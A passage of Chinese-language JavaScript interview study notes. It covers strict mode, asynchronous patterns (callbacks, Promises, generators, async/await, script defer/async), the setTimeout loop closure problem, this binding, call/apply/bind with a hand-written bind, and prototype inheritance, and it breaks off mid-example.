    'use strict'
    function fn() {} 
    var a = 1
    delete a
}
strictMode() // 将报错
```

- 严格模式**禁用with语法**，使用将报错

```js
function usualMode() {
    with({a: 1}) {
    	console.log(a)
    }
}
usalMode() // 正常输出 1
 
function strictMode() {
    'use strict'
    with({a: 1}) {
    	console.log(a)
    }
}
strictMode() // 将报错
```

---

# 异步相关

-----

## 1. promise和 async await 区别

- **概念**
  **Promise** 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，**Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果**，而这些结果一旦生成是无法改变的

  **async await**也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。

- ##### 两者的区别

  1. Promise的出现解决了传统callback函数导致的“回调地狱”问题，但它的语法导致了它向纵向发展行成了一个**回调链**，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，**await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖**，只有这一句代码执行完，才会执行下一句。
  2. async await与Promise一样，**是非阻塞的**。
  3. async await是基于Promise实现的，可以说是改良版的Promise，**它不能用于普通的回调函数**。



------

## 2. defer和async区别

如果script标签中没有defer或async属性，浏览器在渲染中遇到script标签就会停止渲染，下载执行js代码，等待JS执行完毕后，浏览器再从中断的地方恢复渲染。这就会造成浏览器阻塞，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。当然在当下，并不是说 script 标签必须放在底部，因为你可以给 script 标签添加 defer 或者 async 属性，异步加载script。


区别**主要在于一个执行时间**,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,

而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个

### async （异步加载）

async属性表示异步执行引入的 JavaScript，**即javaScript下载时html并未停止解析**，等到javaScript下载完成，html就停止解析，执行javaScript代码，等待javaScript执行完毕，浏览器再继续渲染。

需要注意的是，**这种方式加载的 JavaScript 依然会阻塞 load 事件**。换句话说，async-script 可能在 DOMContentLoaded 触发之前或之后执行，**但一定在 load 触发之前执行**。如果有多个js脚本，哪个先下载完成就先执行哪个，跟书写顺序没有关系。


### defer （延迟执行）

defer 属性表示延迟执行引入的 JavaScript，即这段 JavaScript 加载时 HTML 并未停止解析，这两个过程是并行的。整个 document 解析完毕且 defer-script 也加载完成之后（这两件事情的顺序无关），会执行所有由 defer-script 加载的 JavaScript 代码，如果有多个defer的script标签，会按顺序执行，**然后触发 DOMContentLoaded 事件**。

(1) defer 是**不会阻塞html解析的**，它是**等DOM加载完之后再去执行JavaScript代码**；async是JavaScript下载完成，就会立即执行代码，等待执行完之后才继续解析HTML。
(2) 在加载多个JS脚本的时候，async是无顺序的加载，而defer是有顺序的加载。

应用场景
defer：如果你的**脚本代码依赖于页面中的DOM元素**（文档是否解析完毕），或者被其他脚本文件依赖。

async：如果你的**脚本并不关心页面中的DOM元素**（文档是否解析完毕），并且也不会产生其他脚本需要的数据。

总结：如果不能确定，使用defer要比async稳定一些。

**解析：**

在没有defer或者async的情况下：会立即执行脚本,**所以通常建议把script放在body最后**

```html
<script src="script.js"></script>
```

async：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。

async 属性的执行是在脚本下载完之后，在 window 的 **load 事件发生之前**。如果这个时候文档还没有解析完全意味着它们**可以阻止 DOM 构建。**

**但是多个js文件的加载顺序不会按照书写顺序进行**

```html
<script async src="script.js"></script>
```

derer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），**但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载**。

defer 属性的执行是在文档完全解析完成后进行的，在 window 的 DOMContentLoaded 事件之前。defer 属性就可以保证它们执行是按照它们出现在 HTML 中的顺序来的，**并且不会阻止主线程的渲染**。

```html
<script defer src="script.js"></script>
```



- 如果这个脚本在加载早期要执行就可以用`async`
- 如果这个脚本没那么重要就可以使用`defer`



**脚本阻塞问题实际有两种解决方案** —— `async` 和 `defer`。我们来依次讲解。

浏览器遇到 `async` 脚本时不会阻塞页面渲染，而是直接下载然后运行。这样脚本的运行次序就无法控制，只是脚本不会阻止剩余页面的显示。当页面的脚本之间彼此独立，且不依赖于本页面的其它任何脚本时，`async` 是最理想的选择。

比如，如果你的页面要加载以下三个脚本：

```html
<script async src="js/vendor/jquery.js"></script>

<script async src="js/script2.js"></script>

<script async src="js/script3.js"></script>
```

三者的调用顺序是不确定的。`jquery.js` 可能在 `script2` 和 `script3` 之前或之后调用，如果这样，后两个脚本中依赖 `jquery` 的函数将产生错误，因为脚本运行时 `jquery` 尚未加载。

解决这一问题可使用 `defer` 属性，脚本将按照在页面中出现的顺序加载和运行：

```html
<script defer src="js/vendor/jquery.js"></script>

<script defer src="js/script2.js"></script>

<script defer src="js/script3.js"></script>
```

添加 `defer` 属性的脚本将按照在页面中出现的顺序加载，因此第二个示例可确保 `jquery.js` 必定加载于 `script2.js` 和 `script3.js` 之前，同时 `script2.js` 必定加载于 `script3.js` 之前。

脚本调用策略小结：

- 如果脚本无需等待页面解析，且无依赖独立运行，那么应使用 `async`。
- 如果脚本需要等待页面解析，且依赖于其它脚本，调用这些脚本时应使用 `defer`，将关联的脚本按所需顺序置于 HTML 中。





------

## 3. 同步和异步

同步

- 指在 **主线程**上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。
- 也就是调用一旦开始，必须这个调用 **返回结果**(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。

异步

- 异步任务是指不进入主线程，而进入 **任务队列**的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。
- 每一个任务有一个或多个 **回调函数**。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。
- 程序的执行顺序和任务的排列顺序是**不一致**的，异步的。
- 我们常用的setTimeout和setInterval函数，Ajax都是异步操作。



------

## 4. 实现异步的方法

回调函数（Callback）、事件监听、发布订阅、Promise/A+、生成器Generators/ yield、async/await

1. JS 异步编程进化史：callback -> promise -> generator -> async + await

2. async/await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。

3. async/await可以说是异步终极解决方案了。

   (1) async/await函数相对于Promise，**优势**体现在：

   - 处理 then 的调用链，能够更清晰准确的写出代码
   - 并且也能优雅地解决回调地狱问题。

   当然async/await函数也存在一些**缺点**，因为 **await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。**

   (2) async/await函数对 Generator 函数的改进，体现在以下三点：

   - 内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，**async 函数的执行，与普通函数一模一样，只要一行**。
   - 更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 **async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）**。
   - 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。**async 表示函数里有异步操作**，await **表示紧跟在后面的表达式需要等待结果。**



### (1) 回调函数（Callback）

回调函数是异步操作最基本的方法。以下代码就是一个回调函数的例子：

```js
ajax(url, () => {
    // 处理逻辑
})
```

但是回调函数有一个致命的弱点，就是容易写出**回调地狱（Callback hell）**。假设多个请求存在依赖性，你可能就会写出如下代码：

```js
ajax(url, () => {
    // 处理逻辑
    ajax(url1, () => {
        // 处理逻辑
        ajax(url2, () => {
            // 处理逻辑
        })
    })
})
```

回调函数的**优点**是简单、容易理解和实现。

**缺点**是不利于代码的阅读和维护，各个部分之间高度耦合，使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），**而且每个任务只能指定一个回调函数**。此外它不能使用 try catch 捕获错误，不能直接 return。



### (2) 事件监听

这种方式下，**异步任务的执行不取决于代码的顺序，而取决于某个事件是否发生**。

下面是两个函数f1和f2，编程的意图是f2必须等到f1执行完成，才能执行。首先，为f1绑定一个事件（这里采用的jQuery的写法）

```js
f1.on('done', f2);
```

上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写：

```js
function f1() {
  setTimeout(function () {
    // ...
    f1.trigger('done');
  }, 1000);
}
```

上面代码中，f1.trigger('done')表示，执行完成后，立即触发done事件，从而开始执行f2。

这种方法的**优点**是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以"去耦合"，有利于实现模块化。

**缺点**是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。



### (3) 发布订阅

我们假定，存在一个"信号中心"，某个任务执行完成，就向信号中心"发布"（publish）一个信号，其他任务可以向信号中心"订阅"（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做"发布/订阅模式"（publish-subscribe pattern），又称"**观察者模式**"（observer pattern）。

首先，f2向信号中心jQuery订阅done信号。

```js
jQuery.subscribe('done', f2);
```

然后，f1进行如下改写：

```js
function f1() {
  setTimeout(function () {
    // ...
    jQuery.publish('done');
  }, 1000);
}

```

上面代码中，jQuery.publish('done')的意思是，f1执行完成后，向信号中心jQuery发布done信号，从而引发f2的执行。 f2完成执行后，可以取消订阅（unsubscribe）

```js
jQuery.unsubscribe('done', f2);
```

这种方法的性质与“事件监听”类似，**但是明显优于后者**。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。



### (4) Promise/A+

Promise本意是**承诺**，在程序中的意思就是**承诺我过一段时间后会给你一个结果**。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等

4.1 Promise的三种状态

- Pending----Promise对象实例创建时候的初始状态
- Fulfilled----可以理解为成功的状态
- Rejected----可以理解为失败的状态

**这个承诺一旦从等待状态变成为其他状态就永远不能更改状态了**，比如说一旦状态变为 resolved 后，就不能 再次改变为Fulfilled

```js
let p = new Promise((resolve, reject) => {
  reject('reject')
  resolve('success')//无效代码不会执行
})
p.then(
  value => {
    console.log(value)
  },
  reason => {
    console.log(reason)//reject
  }
)

```

当我们在构造 Promise 的时候，构造函数内部的代码是立即执行的

```js
new Promise((resolve, reject) => {
  console.log('new Promise')
  resolve('success')
})
console.log('end')
// new Promise => end

```

4.2 promise的链式调用

- 每次调用返回的都是一个新的Promise实例(这就是then可用链式调用的原因)

- 如果then中返回的是一个结果的话会把这个结果传递下一次then中的成功回调

- 如果then中出现异常,会走下一个then的失败回调

- 在 then中使用了return，那么 return 的值会被Promise.resolve() 包装(见例1，2)

- then中可以不传递参数，如果不传递会透到下一个then中(见例3)

- catch 会捕获到没有捕获的异常

  

  接下来我们看几个例子：
  
  ```js
  // 例1
  Promise.resolve(1)
  .then(res => {
    console.log(res)
    return 2 //包装成 Promise.resolve(2)
  })
  .catch(err => 3)
  .then(res => console.log(res))
  
  // 例2
  Promise.resolve(1)
  .then(x => x + 1)
  .then(x => {
    throw new Error('My Error')
  })
  .catch(() => 1)
  .then(x => x + 1)
  .then(x => console.log(x)) //2
  .catch(console.error)
  
  // 例3
  let fs = require('fs')
  function read(url) {
      return new Promise((resolve, reject) => {
        fs.readFile(url, 'utf8', (err, data) => {
          if (err) reject(err)
          resolve(data)
        })
      })
  }
  read('./name.txt')
  .then(function(data) {
    throw new Error() //then中出现异常,会走下一个then的失败回调
  }) //由于下一个then没有失败回调，就会继续往下找，如果都没有，就会被catch捕获到
  .then(function(data) {
    console.log('data')
  })
  .then()
  .then(null, function(err) {
    console.log('then', err)// then error
  })
  .catch(function(err) {
    console.log('error')
  })
  
  ```

  Promise不仅能够捕获错误，而且也很好地解决了回调地狱的问题，可以把之前的回调地狱例子改写为如下代码：
  
  ```js
  ajax(url)
  .then(res => {
      console.log(res)
      return ajax(url1)
  }).then(res => {
      console.log(res)
      return ajax(url2)
  }).then(res => console.log(res))
  
  ```
  
  它也是存在一些**缺点**的，比如无法取消 Promise，错误需要通过回调函数捕获。
  
  

### (5) 生成器Generators/ yield

Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同，Generator 最大的特点就是可以控制函数的执行。

- 语法上，首先可以把它理解成，Generator 函数是一个状态机，封装了多个内部状态。

- **Generator 函数除了状态机，还是一个遍历器对象生成函数**。

- **可暂停函数, yield可暂停，next方法可启动，每次返回的是yield后的表达式结果**。

- yield表达式本身没有返回值，或者说总是返回undefined。**next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值**。

  我们先来看个例子：

```js
function *foo(x) {
  let y = 2 * (yield (x + 1))
  let z = yield (y / 3)
  return (x + y + z)
}
let it = foo(5)
console.log(it.next())   // => {value: 6, done: false}
console.log(it.next(12)) // => {value: 8, done: false}
console.log(it.next(13)) // => {value: 42, done: true}

```

可能结果跟你想象不一致，接下来我们逐行代码分析：

- 首先 Generator 函数调用和普通函数不同，它会返回一个迭代器

- 当执行第一次 next 时，传参会被忽略，并且函数暂停在 yield (x + 1) 处，所以返回 5 + 1 = 6

- 当执行第二次 next 时，传入的参数12就会被当作上一个yield表达式的返回值，**如果你不传参，yield 永远返回 undefined**。此时 let y = 2 * 12，所以第二个 yield 等于 2 * 12 / 3 = 8

- 当执行第三次 next 时，传入的参数13就会被当作上一个yield表达式的返回值，所以 z = 13, x = 5, y = 24，相加等于 42

  

  我们再来看个例子：有三个本地文件，分别1.txt,2.txt和3.txt，内容都只有一句话，下一个请求依赖上一个请求的结果，想通过Generator函数依次调用三个文件

  ```js
  1.txt
  //1.txt文件
  
  2.txt
  //2.txt文件
  
  3.txt
  //3.txt文件
  ```

  

  ```js
  let fs = require('fs')
  function read(file) {
    return new Promise(function(resolve, reject) {
      fs.readFile(file, 'utf8', function(err, data) {
        if (err) reject(err)
        resolve(data)
      })
    })
  }
  function* r() {
    let r1 = yield read('./1.txt')
    let r2 = yield read(r1)
    let r3 = yield read(r2)
    console.log(r1)
    console.log(r2)
    console.log(r3)
  }
  
  let it = r()
  let { value, done } = it.next()
  value.then(function(data) { // value是个promise
    console.log(data) //data=>2.txt
    let { value, done } = it.next(data)
    value.then(function(data) {
      console.log(data) //data=>3.txt
      let { value, done } = it.next(data)
      value.then(function(data) {
        console.log(data) //data=>结束
      })
    })
  })
  
  ```
  
  

从上例中我们看出手动迭代Generator函数很麻烦，实现逻辑有点绕，而实际开发一般会配合co库去使用。**co是一个为Node.js和浏览器打造的基于生成器的流程控制工具，借助于Promise，你可以使用更加优雅的方式编写非阻塞代码**。

安装co库只需：

```bash
npm install co
```

上面例子只需两句话就可以轻松实现

```js
function* r() {
  let r1 = yield read('./1.txt')
  let r2 = yield read(r1)
  let r3 = yield read(r2)
  console.log(r1)
  console.log(r2)
  console.log(r3)
}

let co = require('co')
co(r()).then(function(data) {
  console.log(data)
})
// 2.txt=>3.txt=>结束=>undefined

```

我们可以通过 Generator 函数解决回调地狱的问题，可以把之前的回调地狱例子改写为如下代码：

```js
function *fetch() {
    yield ajax(url, () => {})
    yield ajax(url1, () => {})
    yield ajax(url2, () => {})
}
let it = fetch()
let result1 = it.next()
let result2 = it.next()
let result3 = it.next()

```



### (6) async/await

6.1 Async/Await简介

使用async/await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：

1.  async/await是基于Promise实现的，它不能用于普通的回调函数。
2. async/await与Promise一样，是非阻塞的。
3. async/await使得异步代码看起来像同步代码，这正是它的魔力所在。`

**一个函数如果加上 async ，那么该函数就会返回一个 Promise**

```js
   async function async1() {
     return "1"
   }
   console.log(async1()) // -> Promise {<resolved>: "1"}

```

Generator函数依次调用三个文件那个例子用async/await写法，只需几句话便可实现

```js
   let fs = require('fs')
   function read(file) {
     return new Promise(function(resolve, reject) {
       fs.readFile(file, 'utf8', function(err, data) {
         if (err) reject(err)
         resolve(data)
       })
     })
   }
   async function readResult(params) {
     try {
       let p1 = await read(params, 'utf8')//await后面跟的是一个Promise实例
       let p2 = await read(p1, 'utf8')
       let p3 = await read(p2, 'utf8')
       console.log('p1', p1)
       console.log('p2', p2)
       console.log('p3', p3)
       return p3
     } catch (error) {
       console.log(error)
     }
   }
   readResult('1.txt').then( // async函数返回的也是个promise
     data => {
       console.log(data)
     },
     err => console.log(err)
   )
   // p1 2.txt
   // p2 3.txt
   // p3 结束
   // 结束

```

6.2 Async/Await并发请求

如果请求两个文件，毫无关系，可以通过并发请求

```js
   let fs = require('fs')
   function read(file) {
     return new Promise(function(resolve, reject) {
       fs.readFile(file, 'utf8', function(err, data) {
         if (err) reject(err)
         resolve(data)
       })
     })
   }
   function readAll() {
     read1()
     read2()//这个函数同步执行
   }
   async function read1() {
     let r = await read('1.txt','utf8')
     console.log(r)
   }
   async function read2() {
     let r = await read('2.txt','utf8')
     console.log(r)
   }
   readAll() // 2.txt 3.txt

```



------

## 5. 怎么解决callback多层嵌套

回调地狱有两种解决方案：

1. Promises
2. Async/await



------

## 6. Promise.all

Promise.all(iterable)方法返回一个Promise实例，此实例在iterable参数内所有的promise都“完成（resolved）”或参数中不包含promise时回调完成（resolve）；如果参数中promise有一个失败（rejected），此实例回调失败（reject），失败的原因是第一个失败promise的结果。



------

## 7. 与promise.all相反的是哪一个

Promse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。



------

## 8.  promise实现文件读取

**封装异步读取文件操作**

- fs.readFile()方法用于异步读取文件(node核心模块)
- 将Promise的实例对象作为函数的返回值返回
- 这样函数执行完毕后就得到一个Promise对象的实例,可以通过.then方法传入成功的回调和失败的回调

```js
const fs = require('fs');
const path = require('path');

function asyncGetFileByPath(p) {
    return new Promise((resolve, reject) => {
        // Promise对象里面的参数,会立即执行(前面说过)
        fs.readFile(path.join(__dirname, p), 'utf-8', (err, data) => {
            if (err) {
                reject(err);
            } else {
                resolve(data);
            }
        })
    })
}
asyncGetFileByPath('./files/1.txt')
    .then(
        (data) => { // 成功的回调
            console.log(data);
        },
        (err) => { // 失败的回调
            console.error(err);
        }
    )


```


**解决回调地狱**

- 前面已经成功的封装了一个读取文件的函数
- 下面用它来体验一下读取多个文件
- 我们在.then()方法中,第一个参数resolve()方法中,返回一个promise对象B.
- 那么在执行.then()的resolve()方法完毕后,此时的执行环境是这个Promise的实例b
- 可以通过b的.then()方法继续传入resolve取消回调地狱,让代码趋于扁平化

```js
const fs = require('fs');
const path = require('path');

function asyncGetFileByPath(p) {
    return new Promise((resolve, reject) => {
        // Promise对象里面的参数,会立即执行(前面说过)
        fs.readFile(path.join(__dirname, p), 'utf-8', (err, data) => {
            if (err) {
                reject(err);
            } else {
                resolve(data);
            }
        })
    })
}
asyncGetFileByPath('./files/1.txt')
    .then(
        (data) => { // 成功的回调    '1.txt'
            console.log(data); // 打印出 1.txt 数据
            return asyncGetFileByPath('./files/2.txt')
        },
        (err) => { // 失败的回调
            console.error(err);
        }
    )
    .then( // 成功的回调  '2.txt'
        (data) => {
            console.log(data); // 打印出 2.txt 中的数据
            return asyncGetFileByPath('./files/3.txt') // 继续返回Promise对象的实例
        },
        (err) => {
            console.error(err);
        }
    )
    .then(
        (data) => { // 成功的回调 '3.txt'
            console.log(data); // 打印出 3.txt 中的数据
        },
        (err) => {
            console.error(err);
        }
    )

```



------

## 9 循环i，setTimeout 中输出什么，如何解决

**for循环setTimeout输出1-10解决方式问题来源**

```js
for (var i = 0; i< 10; i++){
   setTimeout((i) => {
   		console.log(i);
   }, 0)
}
```

期望：输出1到10

为什么无法输出1到十

在上面的代码中，**for循环是同步代码**，**setTimeout是异步代码**。遇到这种既包含同步又包含异步的情况，JavaScript依旧按照从上到下的顺序执行同步代码，并将异步代码插入任务队列。setTimeout的第二个参数则是把执行代码（console.log(i)）添加到任务队列需等待的毫秒数，但等待的时间是相对主程序完毕的时间计算的，**也就是说，在执行到setTimeout函数时会等待一段时间，再将当前任务插入任务队列。**

最后，当执行完同步代码，js引擎就会去执行任务队列中的异步代码。这时候任务队列中就会有十个console.log(i)。我们知道，在每次循环中将setTimeout里面的代码“console.log(i)”放入任务队列时，i的值都是不一样的。但JavaScript引擎开始执行任务队列中的代码时，会开始在当前的作用域中开始找变量i，**但是当前作用域中并没有对变量i进行定义**。这个时候就**会在创造该函数的作用域中寻找i**。创建该函数的作用域就是全局作用域，这个时候就找到了for循环中的变量i，**这时的i是全局变量，并且值已经确定：10。**十个console.log“共享”i的值。**这就是作用域链的问题**。

**解决方法**

(1) 方法一,  **附加参数**，一旦定时器到期，它们会作为参数传递给`function`

```js
for (var i = 0; i< 10; i++){
   setTimeout((i) => {
      console.log(i)
   }, 1000, i);
}
```

> **最精简解决方案**

(2) 方法二  **利用let形成块级作用域**

```js
for (let i = 0; i< 10; i++){
   setTimeout(() => {
      console.log(i) 
   }, 1000);
}

```

> **最优解决方案**

(3) 方法三  **立即执行函数**

```js
    for (var i = 0; i< 10; i++){
      ((i)=>{
        setTimeout(() => {
          console.log(i)
        },1000);
      })(i)
    }

```

> IIFE(**立即执行函数)**，类似于let生成了块级作用域。



(4) 方法四

```js
for (var i = 0; i< 10; i++){
      try {
        throw i
      } catch(i) {
        setTimeout(() => {
          console.log(i)
        }, 1000)
      }
}

```



------



# this相关

------

## 1. call appy bind的作用和区别

作用：

都可以改变函数内部的this指向。

区别点：

1. call 和 apply 会调用函数，并且改变函数内部this指向。
2. call 和 apply 传递的参数不一样，call 传递参数arg1,arg2...形式，apply 必须数组形式[arg]
3. **bind 不会调用函数**，可以改变函数内部this指向。

**解析：**

call方法

改变函数内部this指向

call()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。

写法：fun.call(thisArg, arg1, arg2, ...) // thisArg为想要指向的对象，arg1,arg2为参数

**call 的主要作用也可以实现继承**

```js
function Person(uname, age) {
    this.uname = uname;
    this.age = age;
  }
 function Son(uname, age) {
    Person.call(this, uname, age);
 }
  var son = new Son("zhang", 12);
  console.log(son);
```



apply方法

apply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。

写法：fun.apply(thisArg, [argsArray])

- thisArg:在fun函数运行时指定的this值
- argsArray:传递的值，必须包含在数组里面
- **返回值就是函数的返回值**，因为他就是调用函数

apply的主要应用，比如可以利用apply可以求得数组中最大值

```js
const arr = [1, 22, 3, 44, 5, 66, 7, 88, 9];
const max = Math.max.apply(Math, arr);
console.log(max);
```



bind方法

bind()方法不会调用函数，但是能改变函数内部this指向

写法：fun.bind(thisArg, arg1, arg2, ...)

- thisArg:在fun函数运行时指定的this值
- arg1,arg2:传递的其他参数
- 返回由指定的this值和初始化参数改造的**原函数拷贝**

```js
var o = {
    name: "lisa"
};
function fn() {
    console.log(this);
}
var f = fn.bind(o);
f();  //{ name: 'lisa' }
```

bind应用

**如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向**，此时用bind再合适不过了

```js
const btns = document.querySelectorAll("button");

for (let i = 0; i < btns.length; i++) {
    btns[i].onclick = function() {
      this.disabled = true;
      setTimeout(
        function() {
          this.disabled = false;
        }.bind(this),
        2000
      );
    };
}
```

**扩展:**

主要应用场景：

1. call 经常做继承。
2. **apply 经常跟数组有关系**，比如借助于数学对象实现数组最大值最小值。
3. bind 不调用函数，但是还想改变this指向，比如**改变定时器内部的this指向**。



------

## 2. this指向（普通函数、匿名函数、箭头函数）

### 普通函数中的this

谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁

```js
let getThis = function () {
    console.log(this);
}

let obj={
    name:"kop",
    getThis:function(){
        console.log(this);
    }
}
//getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window
getThis();//window

//此处的getThis()方法是obj这个对象调用的，所以this指向obj
obj.getThis();//{ name: 'kop', getThis: [Function: getThis] }
```

### **匿名函数中的this**：

匿名函数的执行具有**全局性**，**则匿名函数中的this指向是window**，而不是调用该匿名函数的对象；

```js
let obj = {
    getThis: function () {
        return function () {
            console.log(this);
        }
    }
}
obj.getThis()(); //window
```

上面代码中，getThis()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 

如果想在上述代码中使this指向调用该方法的对象，**可以提前把this传值给另外一个变量(_this或者that)**：

```js
let obj = {
    getThis: function () {
    //提前保存this指向
        let _this=this
        return function () {
            console.log(_this);
        }
    }
}
obj.getThis()(); // { getThis: [Function: getThis] }
```



### **箭头函数中的this**

1. 箭头函数中的this是**在函数定义的时候就确定下来的**，而不是在函数调用的时候确定的；
2. **箭头函数中的this指向父级作用域的执行上下文**；（技巧：因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，**则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this**）
3. **箭头函数无法使用apply、call和bind方法改变this指向**，因为其this值在函数定义的时候就被确定下来。

例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下面注释代码处的this，即obj。

```js
let obj = {
    //此处的this即是箭头函数中的this
    getThis: function () {
        return  ()=> {
            console.log(this);
        }
    }
}
obj.getThis()(); // { getThis: [Function: getThis] }
```

例2：该段代码中存在两个箭头函数，**this找不到对应的function(){}**，所以一直往上找直到指向window。

```js
//代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。
let obj = {
    getThis: ()=> {
        return  ()=> {
            console.log(this);
        }
    }
}
obj.getThis()(); //window

```



------

## 3. 手写bind

1. Function.prototype.bind,这样就可以**让所有函数的隐式原型上都会有一个bind**了。

```js
Function.prototype.bind = function() {
    // TODO
}

```

2. bind的**第一个形参是要绑定给函数的上下文**，所以再完善一下上面的代码

```js
Function.prototype.bind = function(context) {
    var fn = this;
    return function() {
        return fn.apply(context);
    }
}
```

3. 真正的bind函数是可以传递多个参数的，第一个参数是要绑定给调用它的函数的上下文，其他的参数将会作为预设参数传递给这个函数，如下所示

```js
let foo = function(){
    console.log(arguments);
}
foo.bind(null,"a","b")("c","d","e"); // {"1":"a","2":"b","3":"c","4":"d","5":"e"}

```

4. 为了实现上面的效果，我们发现**只要在返回的值上将函数合并上去就行了**

```js
Function.prototype.bind=function(context,...args){
    var fn=this;
    return function(...rest){
        return fn.apply(context,[...args,...rest]);
    }
}

let foo=function(){
    console.log(arguments);
}

foo.bind(null,"a","b")("c","d","e");  //[Arguments] { '0': 'a', '1': 'b', '2': 'c', '3': 'd', '4': 'e' }
```

5. 为了兼容性，替换成ES5的写法

```js
Function.prototype.bind = function(){
    var args = Array.prototype.slice.call(arguments);
    var context = args.splice(0, 1)[0];
    var fn = this;
    return function(){
        var rest = Array.prototype.slice.call(arguments);
        return fn.apply(context, args.concat(rest));
    }
}

let foo = function(){
    console.log(arguments);
}

foo.bind(null,"a","b")("c","d","e");  //[Arguments] { '0': 'a', '1': 'b', '2': 'c', '3': 'd', '4': 'e' }
```

6. 把函数的原型保留下来。

```js
Function.prototype.bind = function(){
    var args = Array.prototype.slice.call(arguments);
    var context = args.splice(0, 1)[0];
    var fn = this;
    var res = function(){
        var rest = Array.prototype.slice.call(arguments);
        return fn.apply(context, args.concat(rest));
    }
    if (this.prototype) {
        res.prototype = this.prototype;
    }
    return res;
}

let foo = function(){
    console.log(arguments);
}

foo.bind(null,"a","b")("c","d","e");  //[Arguments] { '0': 'a', '1': 'b', '2': 'c', '3': 'd', '4': 'e' }
```

7. 最后还需要再找到一种方法来判断是否对bind之后的结果使用了new操作符。

```js
Function.prototype.bind = function(){
    var args = Array.prototype.slice.call(arguments);
    var context = args.splice(0, 1)[0];
    var fn = this;

    var noop = function() {}

    var res = function(){
        var rest = Array.prototype.slice.call(arguments);
        // this只和运行的时候有关系，所以这里的this和上面的fn不是一码事，new res()和res()在调用的时候，res中的this是不同的东西
        return fn.apply(this instanceof noop ? this : context, args.concat(rest));
    }
    if (this.prototype) {
        noop.prototype = this.prototype;
    }

    res.prototype = new noop();
    return res;
}

let foo = function(){
    console.log(arguments);
}

foo.bind(null,"a","b")("c","d","e");  //[Arguments] { '0': 'a', '1': 'b', '2': 'c', '3': 'd', '4': 'e' }
```





------

## 4. 箭头函数能否当构造函数

**箭头函数表达式**的语法比函数表达式更简洁，并且没有自己的this，arguments，super或new.target。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。



------

## 5.  继承，优缺点

- 继承的好处
  - a：提高了代码的复用性
  - b：提高了代码的维护性
  - c：让类与类之间产生了关系，是多态的前提
- 继承的弊端
  - 类的耦合性增强了,但是开发的原则：高内聚，低耦合。
  
  

------

## 6.  js继承的方法和优缺点

(1) 原型链继承

**实现方式**：将子类的原型链指向父类的对象实例

```js
function Parent(){
    this.name="parent";
    this.list=["a"];
}
Parent.prototype.sayHi=function(){
    console.log("Hello!");
}

function Child(){}
Child.prototype=new Parent();

var child=new Child();
console.log(child.name);  //parent
child.sayHi();  //Hello!

var a=new Child();
var b=new Child();
a.list.push("b");
console.log(b.list);  //[ 'a', 'b' ]
```

**原理**：子类实例child的`__proto__`指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的`__proto__`指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法

**优点**：可继承构造函数的属性，父类构造函数的属性，父类原型的属性

**缺点**：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化.



(2) 构造函数继承

**实现方式**：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数

```js
function Parent(name,id){
    this.id=id;
    this.name=name;
    this.list=["a"];
    this.printName=function(){
        console.log(this.name);
    }
}
Parent.prototype.sayName=function(){
    console.log(this.name);
}

function Child(name,id){
